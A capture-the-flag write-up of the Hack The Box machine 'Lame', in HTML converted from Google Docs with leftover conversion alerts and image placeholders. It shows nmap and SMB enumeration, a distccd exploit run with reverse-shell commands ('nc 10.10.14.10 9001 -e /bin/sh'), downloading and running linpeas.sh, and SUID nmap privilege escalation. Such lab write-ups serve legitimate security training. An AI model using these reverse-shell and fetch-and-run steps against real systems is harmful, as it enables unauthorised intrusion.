# HTB_Writeups - Lame


<p style="color: red; font-weight: bold">>>>>>  gd2md-html alert:  ERRORs: 0; WARNINGs: 0; ALERTS: 14.</p>
<ul style="color: red; font-weight: bold"><li>See top comment block for details on ERRORs and WARNINGs. <li>In the converted Markdown or HTML, search for inline alerts that start with >>>>>  gd2md-html alert:  for specific instances that need correction.</ul>

<p style="color: red; font-weight: bold">Links to alert messages:</p><a href="#gdcalert1">alert1</a>
<a href="#gdcalert2">alert2</a>
<a href="#gdcalert3">alert3</a>
<a href="#gdcalert4">alert4</a>
<a href="#gdcalert5">alert5</a>
<a href="#gdcalert6">alert6</a>
<a href="#gdcalert7">alert7</a>
<a href="#gdcalert8">alert8</a>
<a href="#gdcalert9">alert9</a>
<a href="#gdcalert10">alert10</a>
<a href="#gdcalert11">alert11</a>
<a href="#gdcalert12">alert12</a>
<a href="#gdcalert13">alert13</a>
<a href="#gdcalert14">alert14</a>

<p style="color: red; font-weight: bold">>>>>> PLEASE check and correct alert issues and delete this message and the inline alerts.<hr></p>


<p>
Started off with a nmap scan.
</p>
<p>
nmap -Pn -T5 -sV -sC -A -p- -oN lame_nmap.txt 10.10.10.3
</p>
<p>
TEs3
</p>
<p>
While that was scanning I went to go check out to see if the website is up. But I don't get anything back and you'll see why when the results are done.
</p>
<p>
We get back some nice info to start us off.
</p>
<p>
Port 80 isn't open so there was no site for me to check.
</p>
<p>
But there was other ports open such as port 21 with the version number of vsftpd 2.3.4 (This version of vsftpd is vulnerable to backdoor command execution
</p>
<p>
CVE-2011-2523) I couldn't get it to work though. So I moved on. If you can't get something to work, don't spend to much time on it. Look at the next route you can take and if you get stuck
</p>
<p>
again then go back and try to repeat your steps to make sure you didn't make a typo somewhere.
</p>
<p>
 
</p>
<p>


<p id="gdcalert1" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image1.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert2">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image1.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>


<p id="gdcalert2" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image2.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert3">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image2.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>
I see that smb is open. 139/445. I run smbmap -H 10.10.10.3 and get back some users.
</p>
<p>
 
</p>
<p>


<p id="gdcalert3" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image3.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert4">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image3.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>
we can see that tmp is READ, WRITE. Lets login and see what we can find.
</p>
<p>
I use smbclient \\\\10.10.10.3\\tmp and we get a hit. I use ls to see what we can find. Unfortunately there is nothing here either. We could use
</p>
<p>
put and get files here but there is no port 80 open for us to execute the files to gain a shell from here. Some bad luck but we got more info so lets keep looking.
</p>
<p>
 
</p>
<p>


<p id="gdcalert4" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image4.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert5">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image4.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>
I go back to the nmap results and see port 3632 is open and it gave us the version of application running. distccd v1
</p>
<p>
I go to google and search for "distccd v1 exploit" first link brings us to<a href="https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855"> https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855</a>
</p>
<p>
after reading the exploit it seems to generate a random alpha numeric string. Reads the string. And looks for the trigger exploit which is command, host, port
</p>
<p>
If it is able to connect to the host it will send the payload and hopefully give us a reverse shell.
</p>
<p>
 
</p>
<p>
Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did chmod +x CVE-2004-2687.py
</p>
<p>
the file is ready to be used. First I started a listener on my attacking machine with nc -lvnp 9001 and then used the following command
</p>
<p>
./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" No good, got errors. Then I tried.
</p>
<p>
python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" I got a connected to remote service Ok but then the
</p>
<p>
socket timed out instantly killing the connection. I went back to the exploit and read the comments, it mentioned that python3 is to new.
</p>
<p>
So I was going to work my way down from python3 to python. Next up,
</p>
<p>
python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" Success, we get a shell!
</p>
<p>
 
</p>
<p>


<p id="gdcalert5" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image5.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert6">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image5.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>


<p id="gdcalert6" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image6.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert7">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image6.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>
Let's upgrade the shell. I used the following.
</p>
<p>
python -c 'import pty; pty.spawn("/bin/bash")' python3 and python2 didn't work.
</p>
<p>
export TERM=xterm
</p>
<p>
stty raw -echo && fg
</p>
<p>
enter
</p>
<p>
enter
</p>
<p>
 
</p>
<p>
We're a normal user daemon. I started off with sudo -l but it asked for a password. Let's move on.
</p>
<p>
I look around a bit and cd /home directory and do a ls and see what's there. Nothing good in the user directory but I did go into makis and find the user.txt file. I do a cat user.txt at it and we get out our first flag.
</p>
<p>
 
</p>
<p>


<p id="gdcalert7" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image7.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert8">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image7.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>


<p id="gdcalert8" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image8.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert9">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image8.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>
Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh
</p>
<p>
I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine.
</p>
<p>
I use python3 -m http.server 80 get the server up and running.
</p>
<p>
On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox.
</p>
<p>
The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file.
</p>
<p>
I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.
</p>
<p>
 
</p>
<p>


<p id="gdcalert9" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image9.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert10">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image9.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<p id="gdcalert10" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image10.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert11">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image10.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>


<p id="gdcalert11" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image11.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert12">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image11.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>
the /usr/bin/nmap suid
</p>
<p>
I head over to<a href="https://gtfobins.github.io/"> https://gtfobins.github.io/</a> and search for nmap
</p>
<p>
I cd /usr/bin where the suid is located.
</p>
<p>
I start off with shell code (a) and nothing happened. So I keep going down the list.
</p>
<p>
Shell (b) worked!
</p>
<p>
 
</p>
<p>


<p id="gdcalert12" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image12.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert13">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image12.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>
we can now cd /root and see what is there which is the root.txt flag!
</p>
<p>
we have successfully rooted this box!
</p>
<p>
 
</p>
<p>


<p id="gdcalert13" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image13.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert14">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image13.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
<p>


<p id="gdcalert14" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image14.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert15">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


<img src="images/image14.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
 
</p>
